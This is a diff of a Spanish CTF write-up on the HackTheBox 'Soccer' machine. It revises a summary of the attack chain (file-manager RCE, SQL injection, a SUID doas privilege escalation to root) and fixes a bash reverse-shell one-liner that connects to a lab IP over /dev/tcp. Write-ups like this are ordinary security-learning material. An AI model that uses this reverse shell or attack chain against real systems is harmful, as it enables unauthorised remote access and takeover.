@@ -4,7 +4,7 @@ date: '2022-12-27'
 tags: ["CTF", "Rce", "Suid", "Dstat", "Doas", "Websockets"]
 draft: true
 authors: ['default']
-summary: 'Reto CTF que consiste en encontrar vulnerabilidades y explotarlas. Se realiza una exploración con nmap y wfuzz, encontrando una ruta /tiny. Se accede al repositorio y se encuentra una vulnerabilidad RCE en Tiny File Manager 2.4.6. Se obtiene acceso al servidor y se encuentra un subdominio donde se pueden verificar tickets de futbol. Se utiliza un script y sqlmap como proxy para realizar sqli. Se encuentra un archivo con el bit SUID activo llamado doas, se crea un plugin para dstat y se ejecuta como root. Finalmente, se obtiene acceso de root al servidor.'
+summary: 'Reto CTF que consiste en encontrar un login vulnerable en un repositorio de Github. Se puede subir archivos y ejecutar código remoto. Luego, se puede realizar una inyección SQL y explotar los privilegios SUID del comando Doas para obtener acceso root.'
 images: ["/static/images/uploads/ctf-soccer-write-up/Soccer.webp", "/static/images/uploads/ctf-soccer-write-up/image.webp", "/static/images/uploads/ctf-soccer-write-up/favicon.ico", "/static/images/uploads/ctf-soccer-write-up/spider-orange.webp", "/static/images/uploads/ctf-soccer-write-up/image-1.webp", "/static/images/uploads/ctf-soccer-write-up/image-2.webp"]
 ---
 
@@ -31,7 +31,7 @@ Exploit DatabaseFEBIN MON SAJI![](/static/images/uploads/ctf-soccer-write-up/spi
 
 
 ```
-bash -c "sh -i & /dev/tcp/10.10.14.88/1111 0&1"
+bash -c "sh -i >& /dev/tcp/10.10.14.88/1111 0>&1"
 ```
 Mirando en /etc/***nginx***/***sites***-***available***/ vemos un subdominio: http://soc-player.soccer.htb. Es una web donde te puedes registrar y verificar tickets de futbol. 
 
